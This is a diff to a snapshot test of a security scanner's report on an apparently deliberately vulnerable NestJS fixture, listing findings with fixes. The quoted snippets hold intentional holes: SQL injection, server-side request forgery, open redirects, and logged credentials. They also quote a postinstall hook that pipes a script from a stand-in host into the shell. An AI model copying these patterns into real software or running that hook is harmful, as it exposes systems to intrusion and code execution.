@@ -5,9 +5,364 @@ expression: rendered
 
 (o.o) 5 files · owasp-top10 · 0.12s
 21 findings (11 high, 10 medium)
+12 internet-reachable, 3 internal, 6 unclassified
 
 ------------------------------------------------------------------------
-HIGH  likely  Credential hardcoded in source  A07:2021
+HIGH  likely  internet  Stack trace leaked in error response  A05:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:37:16
+
+  35 |       throw new InternalServerErrorException({
+  36 |         message: 'could not load users',
+  37 |         stack: err.stack,
+     |                ~~~~~~~~~ leaks internal stack trace to the client
+  38 |       })
+  39 |     }
+
+ -> fix (NestJS)   Throw the exception without a custom body; let the
+                   built-in filter shape the response.
+                   this.logger.error(err)
+                   throw new InternalServerErrorException()
+ -> why            Stack traces expose absolute file paths, dependency
+                   versions, and internal call structure — enough to
+                   fingerprint the stack and locate other weaknesses.
+ i  ref            OWASP A05:2021 | CWE-209 | RULES.md#stack-trace-leak
+
+------------------------------------------------------------------------
+HIGH  likely  internet  SQL query built by string interpolation  A03:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:55:7
+
+  53 |     // sql-injection
+  54 |     const rows = await this.pool.query(
+  55 |       `SELECT id, role FROM users WHERE email = '${body.email}'`,
+     |       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ query text is built at runtime
+  56 |     )
+
+ -> fix (NestJS)   Use the repository API, or bind parameters on the
+                   query builder.
+                   await this.repo
+                     .createQueryBuilder('user')
+                     .where('user.id = :id', { id })
+                     .getOne()
+ -> why            A value taken from the request is interpolated into
+                   SQL, so the caller controls part of the statement.
+                   That is enough to read other users' rows, bypass a
+                   WHERE clause, or drop a table.
+ i  ref            OWASP A03:2021 | CWE-89 | RULES.md#sql-injection
+
+------------------------------------------------------------------------
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:80:28
+
+  78 |   async importRemote(@Body() body: { sourceUrl?: string }) {
+  79 |     // ssrf
+  80 |     const upstream = await fetch(body.sourceUrl as string)
+     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  81 |     return upstream.json()
+  82 |   }
+
+ -> fix (NestJS)   Validate in the service, not the controller, so every
+                   caller of it is covered.
+                   const target = assertAllowedUrl(dto.url)
+                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
+ -> why            The destination of this request comes from the
+                   caller, so they choose which host the server connects
+                   to. That includes hosts they cannot reach themselves:
+                   the cloud metadata endpoint that hands out IAM
+                   credentials, internal services that skip
+                   authentication because they are 'not exposed', and
+                   anything bound to localhost.
+ i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
+
+------------------------------------------------------------------------
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:87:28
+
+  85 |   async importRemoteViaAxios(@Body() body: { callerUrl?: string }) {
+  86 |     // ssrf: axios reaches a second caller-controlled host.
+  87 |     const upstream = await axios.get(body.callerUrl as string)
+     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  88 |     return upstream.data
+  89 |   }
+
+ -> fix (NestJS)   Validate in the service, not the controller, so every
+                   caller of it is covered.
+                   const target = assertAllowedUrl(dto.url)
+                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
+ -> why            The destination of this request comes from the
+                   caller, so they choose which host the server connects
+                   to. That includes hosts they cannot reach themselves:
+                   the cloud metadata endpoint that hands out IAM
+                   credentials, internal services that skip
+                   authentication because they are 'not exposed', and
+                   anything bound to localhost.
+ i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
+
+------------------------------------------------------------------------
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:94:28
+
+  92 |   async importViaGot(@Body() body: { gotUrl?: string }) {
+  93 |     // ssrf: got reaches a third caller-controlled host.
+  94 |     const upstream = await got.get(body.gotUrl as string)
+     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  95 |     return upstream.body
+  96 |   }
+
+ -> fix (NestJS)   Validate in the service, not the controller, so every
+                   caller of it is covered.
+                   const target = assertAllowedUrl(dto.url)
+                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
+ -> why            The destination of this request comes from the
+                   caller, so they choose which host the server connects
+                   to. That includes hosts they cannot reach themselves:
+                   the cloud metadata endpoint that hands out IAM
+                   credentials, internal services that skip
+                   authentication because they are 'not exposed', and
+                   anything bound to localhost.
+ i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
+
+------------------------------------------------------------------------
+HIGH  likely  internet  Server fetches a URL the caller controls  A10:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:102:7
+
+  100 |     // ssrf: node https.get to a fourth caller-controlled host.
+  101 |     await new Promise<void>((resolve, reject) => {
+  102 |       https.get(body.nodeUrl as string, (up) => {
+      |       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  103 |         up.resume()
+  104 |         up.on('end', () => resolve())
+
+ -> fix (NestJS)   Validate in the service, not the controller, so every
+                   caller of it is covered.
+                   const target = assertAllowedUrl(dto.url)
+                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
+ -> why            The destination of this request comes from the
+                   caller, so they choose which host the server connects
+                   to. That includes hosts they cannot reach themselves:
+                   the cloud metadata endpoint that hands out IAM
+                   credentials, internal services that skip
+                   authentication because they are 'not exposed', and
+                   anything bound to localhost.
+ i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
+
+------------------------------------------------------------------------
+MEDIUM  likely  internet  Sensitive data written to a log  A09:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:48:23
+
+  46 |   ) {
+  47 |     // sensitive-data-logged
+  48 |     this.logger.log({ password: body.password })
+     |                       ~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
+  49 | 
+  50 |     // sensitive-data-logged: an access token, logged the same way.
+
+ -> fix (NestJS)   Use the Nest logger with a redacted payload.
+                   this.logger.log({ event: 'login_attempt', userId })
+                   // never: this.logger.log({ password: dto.password })
+ -> why            Logs are copied into aggregators, retained for
+                   months, and readable by anyone with access to the
+                   logging system. A credential that reaches a log has
+                   left the application's trust boundary.
+ i  ref            OWASP A09:2021 | CWE-532 |
+                   RULES.md#sensitive-data-logged
+
+------------------------------------------------------------------------
+MEDIUM  likely  internet  Sensitive data written to a log  A09:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:51:23
+
+  49 | 
+  50 |     // sensitive-data-logged: an access token, logged the same way.
+  51 |     this.logger.log({ accessToken: body.accessToken })
+     |                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
+  52 | 
+  53 |     // sql-injection
+
+ -> fix (NestJS)   Use the Nest logger with a redacted payload.
+                   this.logger.log({ event: 'login_attempt', userId })
+                   // never: this.logger.log({ password: dto.password })
+ -> why            Logs are copied into aggregators, retained for
+                   months, and readable by anyone with access to the
+                   logging system. A credential that reaches a log has
+                   left the application's trust boundary.
+ i  ref            OWASP A09:2021 | CWE-532 |
+                   RULES.md#sensitive-data-logged
+
+------------------------------------------------------------------------
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:67:5
+
+  65 |   go(@Query() query: { next?: string }, @Res() res: Response) {
+  66 |     // open-redirect — `query` is a universal request-source name.
+  67 |     res.redirect(query.next as string)
+     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  68 |   }
+
+ -> fix (NestJS)   Validate in the controller, or put the check in a
+                   pipe so every redirect gets it.
+                   @Get('login')
+                   @Redirect()
+                   login(@Query('next') next: string) {
+                     return { url: safeRedirect(next, this.config.publicUrl) }
+                   }
+ -> why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
+
+------------------------------------------------------------------------
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:73:5
+
+  71 |   goHeader(@Query() query: { next?: string }, @Res() res: Response) {
+  72 |     // open-redirect: a hand-rolled Location header instead of res.redirect().
+  73 |     res.setHeader('Location', query.next as string)
+     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  74 |     res.status(302).end()
+  75 |   }
+
+ -> fix (NestJS)   Validate in the controller, or put the check in a
+                   pipe so every redirect gets it.
+                   @Get('login')
+                   @Redirect()
+                   login(@Query('next') next: string) {
+                     return { url: safeRedirect(next, this.config.publicUrl) }
+                   }
+ -> why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
+
+------------------------------------------------------------------------
+MEDIUM  likely  internet  Redirect target comes from the caller  A01:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:113:5
+
+  111 |   goStatus(@Query() query: { extraNext?: string }, @Res() res: Response) {
+  112 |     // open-redirect: status-first form — still caller-controlled.
+  113 |     res.redirect(302, query.extraNext as string)
+      |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
+  114 |   }
+
+ -> fix (NestJS)   Validate in the controller, or put the check in a
+                   pipe so every redirect gets it.
+                   @Get('login')
+                   @Redirect()
+                   login(@Query('next') next: string) {
+                     return { url: safeRedirect(next, this.config.publicUrl) }
+                   }
+ -> why            The whole redirect target comes from the request, so
+                   a link to this endpoint can send a visitor anywhere.
+                   The URL they click genuinely belongs to you, which is
+                   what makes the page they land on convincing — and on
+                   an OAuth callback the authorisation code goes with
+                   them.
+ i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
+
+------------------------------------------------------------------------
+MEDIUM  possible  internet  Cookie set without its protective attributes  A05:2021
+------------------------------------------------------------------------
+ src/users/users.controller.ts:59:5
+
+  57 | 
+  58 |     // insecure-cookie
+  59 |     res.cookie('session', rows[0]?.id ?? 'anon')
+     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ cookie written without httpOnly/secure/sameSite
+  60 | 
+  61 |     return { ok: true }
+
+ -> fix (NestJS)   Pass the attributes through the injected response.
+                   res.cookie('session', token, {
+                     httpOnly: true,
+                     secure: process.env.NODE_ENV === 'production',
+                     sameSite: 'lax',
+                   })
+ -> why            This cookie is missing protections: httpOnly keeps
+                   the cookie out of reach of JavaScript, so a
+                   cross-site scripting bug cannot read the session;
+                   secure stops the cookie being sent over plain HTTP;
+                   sameSite stops the browser attaching the cookie to
+                   cross-site requests.
+ i  ref            OWASP A05:2021 | CWE-614 | RULES.md#insecure-cookie
+
+------------------------------------------------------------------------
+MEDIUM  likely  internal  GitHub Action is not pinned to a commit SHA  A08:2021
+------------------------------------------------------------------------
+ .github/workflows/ci.yml:8:1
+
+ -> fix (NestJS)   Pin the action to a full commit SHA (keep the tag in
+                   a comment for humans).
+                   uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+ -> why            A moving tag can be retargeted to a different commit.
+                   Anyone who can push that tag — or who compromises the
+                   action's repository — runs code in your CI with
+                   access to repository secrets.
+ i  ref            OWASP A08:2021 | CWE-829 |
+                   RULES.md#ci-unpinned-action
+
+------------------------------------------------------------------------
+MEDIUM  likely  internal  Package declares an install-time script  A08:2021
+------------------------------------------------------------------------
+ package.json:7:5
+
+   5 |   "description": "Deliberately vulnerable NestJS fixture. Never deploy this.",
+   6 |   "scripts": {
+   7 |     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+     |                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
+   8 |   },
+   9 |   "dependencies": {
+
+ -> fix (NestJS)   Move the work into an explicit script the developer
+                   runs (`pnpm setup`), or into the build step. If it
+                   genuinely has to run at install time — a native addon
+                   — say so in the README and keep the script to the
+                   build tool, with no network fetch and no run-time
+                   package resolve.
+                   // package.json
+                   "scripts": { "build": "nest build" }  // called by the Dockerfile, not by install
+ -> why            `postinstall` runs for everyone who installs this
+                   package, before any code is reviewed and often inside
+                   CI with credentials in the environment. This is the
+                   mechanism a compromised package uses to spread.
+ i  ref            OWASP A08:2021 | CWE-829 |
+                   RULES.md#install-lifecycle-script
+
+------------------------------------------------------------------------
+MEDIUM  likely  internal  Dependency version is unpinned  A06:2021
+------------------------------------------------------------------------
+ package.json:17:1
+
+ -> fix (NestJS)   Pin the dependency in package.json and reinstall so
+                   the lockfile records it.
+                   {
+                     "dependencies": {
+                       "@nestjs/core": "^10.0.0"
+                     }
+                   }
+ -> why            An unpinned range lets the next install resolve a
+                   different major version, including one with a known
+                   vulnerability or a breaking API change, without
+                   anyone reviewing the bump.
+ i  ref            OWASP A06:2021 | CWE-1104 |
+                   RULES.md#unpinned-dependency
+
+------------------------------------------------------------------------
+HIGH  likely  unknown  Credential hardcoded in source  A07:2021
 ------------------------------------------------------------------------
  src/billing.ts:2:20
 
@@ -29,7 +384,7 @@ HIGH  likely  Credential hardcoded in source  A07:2021
  i  ref            OWASP A07:2021 | CWE-798 | RULES.md#hardcoded-secret
 
 ------------------------------------------------------------------------
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ------------------------------------------------------------------------
  src/crypto.ts:5:35
 
@@ -52,7 +407,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto
 
 ------------------------------------------------------------------------
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ------------------------------------------------------------------------
  src/crypto.ts:10:24
 
@@ -74,7 +429,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto
 
 ------------------------------------------------------------------------
-HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
+HIGH  likely  unknown  Broken cryptographic primitive protecting a secret  A02:2021
 ------------------------------------------------------------------------
  src/crypto.ts:15:18
 
@@ -105,7 +460,7 @@ HIGH  likely  Broken cryptographic primitive protecting a secret  A02:2021
  i  ref            OWASP A02:2021 | CWE-327 | RULES.md#weak-crypto
 
 ------------------------------------------------------------------------
-HIGH  likely  Cross-origin policy accepts any origin  A05:2021
+HIGH  likely  unknown  Cross-origin policy accepts any origin  A05:2021
 ------------------------------------------------------------------------
  src/main.ts:10:3
 
@@ -129,335 +484,7 @@ HIGH  likely  Cross-origin policy accepts any origin  A05:2021
  i  ref            OWASP A05:2021 | CWE-942 | RULES.md#cors-permissive
 
 ------------------------------------------------------------------------
-HIGH  likely  Stack trace leaked in error response  A05:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:37:16
-
-  35 |       throw new InternalServerErrorException({
-  36 |         message: 'could not load users',
-  37 |         stack: err.stack,
-     |                ~~~~~~~~~ leaks internal stack trace to the client
-  38 |       })
-  39 |     }
-
- -> fix (NestJS)   Throw the exception without a custom body; let the
-                   built-in filter shape the response.
-                   this.logger.error(err)
-                   throw new InternalServerErrorException()
- -> why            Stack traces expose absolute file paths, dependency
-                   versions, and internal call structure — enough to
-                   fingerprint the stack and locate other weaknesses.
- i  ref            OWASP A05:2021 | CWE-209 | RULES.md#stack-trace-leak
-
-------------------------------------------------------------------------
-HIGH  likely  SQL query built by string interpolation  A03:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:55:7
-
-  53 |     // sql-injection
-  54 |     const rows = await this.pool.query(
-  55 |       `SELECT id, role FROM users WHERE email = '${body.email}'`,
-     |       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ query text is built at runtime
-  56 |     )
-
- -> fix (NestJS)   Use the repository API, or bind parameters on the
-                   query builder.
-                   await this.repo
-                     .createQueryBuilder('user')
-                     .where('user.id = :id', { id })
-                     .getOne()
- -> why            A value taken from the request is interpolated into
-                   SQL, so the caller controls part of the statement.
-                   That is enough to read other users' rows, bypass a
-                   WHERE clause, or drop a table.
- i  ref            OWASP A03:2021 | CWE-89 | RULES.md#sql-injection
-
-------------------------------------------------------------------------
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:80:28
-
-  78 |   async importRemote(@Body() body: { sourceUrl?: string }) {
-  79 |     // ssrf
-  80 |     const upstream = await fetch(body.sourceUrl as string)
-     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  81 |     return upstream.json()
-  82 |   }
-
- -> fix (NestJS)   Validate in the service, not the controller, so every
-                   caller of it is covered.
-                   const target = assertAllowedUrl(dto.url)
-                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
- -> why            The destination of this request comes from the
-                   caller, so they choose which host the server connects
-                   to. That includes hosts they cannot reach themselves:
-                   the cloud metadata endpoint that hands out IAM
-                   credentials, internal services that skip
-                   authentication because they are 'not exposed', and
-                   anything bound to localhost.
- i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
-
-------------------------------------------------------------------------
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:87:28
-
-  85 |   async importRemoteViaAxios(@Body() body: { callerUrl?: string }) {
-  86 |     // ssrf: axios reaches a second caller-controlled host.
-  87 |     const upstream = await axios.get(body.callerUrl as string)
-     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  88 |     return upstream.data
-  89 |   }
-
- -> fix (NestJS)   Validate in the service, not the controller, so every
-                   caller of it is covered.
-                   const target = assertAllowedUrl(dto.url)
-                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
- -> why            The destination of this request comes from the
-                   caller, so they choose which host the server connects
-                   to. That includes hosts they cannot reach themselves:
-                   the cloud metadata endpoint that hands out IAM
-                   credentials, internal services that skip
-                   authentication because they are 'not exposed', and
-                   anything bound to localhost.
- i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
-
-------------------------------------------------------------------------
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:94:28
-
-  92 |   async importViaGot(@Body() body: { gotUrl?: string }) {
-  93 |     // ssrf: got reaches a third caller-controlled host.
-  94 |     const upstream = await got.get(body.gotUrl as string)
-     |                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  95 |     return upstream.body
-  96 |   }
-
- -> fix (NestJS)   Validate in the service, not the controller, so every
-                   caller of it is covered.
-                   const target = assertAllowedUrl(dto.url)
-                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
- -> why            The destination of this request comes from the
-                   caller, so they choose which host the server connects
-                   to. That includes hosts they cannot reach themselves:
-                   the cloud metadata endpoint that hands out IAM
-                   credentials, internal services that skip
-                   authentication because they are 'not exposed', and
-                   anything bound to localhost.
- i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
-
-------------------------------------------------------------------------
-HIGH  likely  Server fetches a URL the caller controls  A10:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:102:7
-
-  100 |     // ssrf: node https.get to a fourth caller-controlled host.
-  101 |     await new Promise<void>((resolve, reject) => {
-  102 |       https.get(body.nodeUrl as string, (up) => {
-      |       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  103 |         up.resume()
-  104 |         up.on('end', () => resolve())
-
- -> fix (NestJS)   Validate in the service, not the controller, so every
-                   caller of it is covered.
-                   const target = assertAllowedUrl(dto.url)
-                   return firstValueFrom(this.http.get(target.toString(), { maxRedirects: 0 }))
- -> why            The destination of this request comes from the
-                   caller, so they choose which host the server connects
-                   to. That includes hosts they cannot reach themselves:
-                   the cloud metadata endpoint that hands out IAM
-                   credentials, internal services that skip
-                   authentication because they are 'not exposed', and
-                   anything bound to localhost.
- i  ref            OWASP A10:2021 | CWE-918 | RULES.md#ssrf
-
-------------------------------------------------------------------------
-MEDIUM  likely  GitHub Action is not pinned to a commit SHA  A08:2021
-------------------------------------------------------------------------
- .github/workflows/ci.yml:8:1
-
- -> fix (NestJS)   Pin the action to a full commit SHA (keep the tag in
-                   a comment for humans).
-                   uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- -> why            A moving tag can be retargeted to a different commit.
-                   Anyone who can push that tag — or who compromises the
-                   action's repository — runs code in your CI with
-                   access to repository secrets.
- i  ref            OWASP A08:2021 | CWE-829 |
-                   RULES.md#ci-unpinned-action
-
-------------------------------------------------------------------------
-MEDIUM  likely  Package declares an install-time script  A08:2021
-------------------------------------------------------------------------
- package.json:7:5
-
-   5 |   "description": "Deliberately vulnerable NestJS fixture. Never deploy this.",
-   6 |   "scripts": {
-   7 |     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
-     |                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
-   8 |   },
-   9 |   "dependencies": {
-
- -> fix (NestJS)   Move the work into an explicit script the developer
-                   runs (`pnpm setup`), or into the build step. If it
-                   genuinely has to run at install time — a native addon
-                   — say so in the README and keep the script to the
-                   build tool, with no network fetch and no run-time
-                   package resolve.
-                   // package.json
-                   "scripts": { "build": "nest build" }  // called by the Dockerfile, not by install
- -> why            `postinstall` runs for everyone who installs this
-                   package, before any code is reviewed and often inside
-                   CI with credentials in the environment. This is the
-                   mechanism a compromised package uses to spread.
- i  ref            OWASP A08:2021 | CWE-829 |
-                   RULES.md#install-lifecycle-script
-
-------------------------------------------------------------------------
-MEDIUM  likely  Dependency version is unpinned  A06:2021
-------------------------------------------------------------------------
- package.json:17:1
-
- -> fix (NestJS)   Pin the dependency in package.json and reinstall so
-                   the lockfile records it.
-                   {
-                     "dependencies": {
-                       "@nestjs/core": "^10.0.0"
-                     }
-                   }
- -> why            An unpinned range lets the next install resolve a
-                   different major version, including one with a known
-                   vulnerability or a breaking API change, without
-                   anyone reviewing the bump.
- i  ref            OWASP A06:2021 | CWE-1104 |
-                   RULES.md#unpinned-dependency
-
-------------------------------------------------------------------------
-MEDIUM  likely  Sensitive data written to a log  A09:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:48:23
-
-  46 |   ) {
-  47 |     // sensitive-data-logged
-  48 |     this.logger.log({ password: body.password })
-     |                       ~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
-  49 | 
-  50 |     // sensitive-data-logged: an access token, logged the same way.
-
- -> fix (NestJS)   Use the Nest logger with a redacted payload.
-                   this.logger.log({ event: 'login_attempt', userId })
-                   // never: this.logger.log({ password: dto.password })
- -> why            Logs are copied into aggregators, retained for
-                   months, and readable by anyone with access to the
-                   logging system. A credential that reaches a log has
-                   left the application's trust boundary.
- i  ref            OWASP A09:2021 | CWE-532 |
-                   RULES.md#sensitive-data-logged
-
-------------------------------------------------------------------------
-MEDIUM  likely  Sensitive data written to a log  A09:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:51:23
-
-  49 | 
-  50 |     // sensitive-data-logged: an access token, logged the same way.
-  51 |     this.logger.log({ accessToken: body.accessToken })
-     |                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sensitive value written to a log
-  52 | 
-  53 |     // sql-injection
-
- -> fix (NestJS)   Use the Nest logger with a redacted payload.
-                   this.logger.log({ event: 'login_attempt', userId })
-                   // never: this.logger.log({ password: dto.password })
- -> why            Logs are copied into aggregators, retained for
-                   months, and readable by anyone with access to the
-                   logging system. A credential that reaches a log has
-                   left the application's trust boundary.
- i  ref            OWASP A09:2021 | CWE-532 |
-                   RULES.md#sensitive-data-logged
-
-------------------------------------------------------------------------
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:67:5
-
-  65 |   go(@Query() query: { next?: string }, @Res() res: Response) {
-  66 |     // open-redirect — `query` is a universal request-source name.
-  67 |     res.redirect(query.next as string)
-     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  68 |   }
-
- -> fix (NestJS)   Validate in the controller, or put the check in a
-                   pipe so every redirect gets it.
-                   @Get('login')
-                   @Redirect()
-                   login(@Query('next') next: string) {
-                     return { url: safeRedirect(next, this.config.publicUrl) }
-                   }
- -> why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
-
-------------------------------------------------------------------------
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:73:5
-
-  71 |   goHeader(@Query() query: { next?: string }, @Res() res: Response) {
-  72 |     // open-redirect: a hand-rolled Location header instead of res.redirect().
-  73 |     res.setHeader('Location', query.next as string)
-     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  74 |     res.status(302).end()
-  75 |   }
-
- -> fix (NestJS)   Validate in the controller, or put the check in a
-                   pipe so every redirect gets it.
-                   @Get('login')
-                   @Redirect()
-                   login(@Query('next') next: string) {
-                     return { url: safeRedirect(next, this.config.publicUrl) }
-                   }
- -> why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
-
-------------------------------------------------------------------------
-MEDIUM  likely  Redirect target comes from the caller  A01:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:113:5
-
-  111 |   goStatus(@Query() query: { extraNext?: string }, @Res() res: Response) {
-  112 |     // open-redirect: status-first form — still caller-controlled.
-  113 |     res.redirect(302, query.extraNext as string)
-      |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ destination chosen by the caller
-  114 |   }
-
- -> fix (NestJS)   Validate in the controller, or put the check in a
-                   pipe so every redirect gets it.
-                   @Get('login')
-                   @Redirect()
-                   login(@Query('next') next: string) {
-                     return { url: safeRedirect(next, this.config.publicUrl) }
-                   }
- -> why            The whole redirect target comes from the request, so
-                   a link to this endpoint can send a visitor anywhere.
-                   The URL they click genuinely belongs to you, which is
-                   what makes the page they land on convincing — and on
-                   an OAuth callback the authorisation code goes with
-                   them.
- i  ref            OWASP A01:2021 | CWE-601 | RULES.md#open-redirect
-
-------------------------------------------------------------------------
-MEDIUM  possible  Security headers are not configured  A05:2021
+MEDIUM  possible  unknown  Security headers are not configured  A05:2021
 ------------------------------------------------------------------------
  src/main.ts:9:21
 
@@ -485,30 +512,4 @@ MEDIUM  possible  Security headers are not configured  A05:2021
  i  ref            OWASP A05:2021 | CWE-693 |
                    RULES.md#security-headers-missing
 
-------------------------------------------------------------------------
-MEDIUM  possible  Cookie set without its protective attributes  A05:2021
-------------------------------------------------------------------------
- src/users/users.controller.ts:59:5
-
-  57 | 
-  58 |     // insecure-cookie
-  59 |     res.cookie('session', rows[0]?.id ?? 'anon')
-     |     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ cookie written without httpOnly/secure/sameSite
-  60 | 
-  61 |     return { ok: true }
-
- -> fix (NestJS)   Pass the attributes through the injected response.
-                   res.cookie('session', token, {
-                     httpOnly: true,
-                     secure: process.env.NODE_ENV === 'production',
-                     sameSite: 'lax',
-                   })
- -> why            This cookie is missing protections: httpOnly keeps
-                   the cookie out of reach of JavaScript, so a
-                   cross-site scripting bug cannot read the session;
-                   secure stops the cookie being sent over plain HTTP;
-                   sameSite stops the browser attaching the cookie to
-                   cross-site requests.
- i  ref            OWASP A05:2021 | CWE-614 | RULES.md#insecure-cookie
-
-Run `owlwarden explain hardcoded-secret` for the full write-up.
+Run `owlwarden explain stack-trace-leak` for the full write-up.
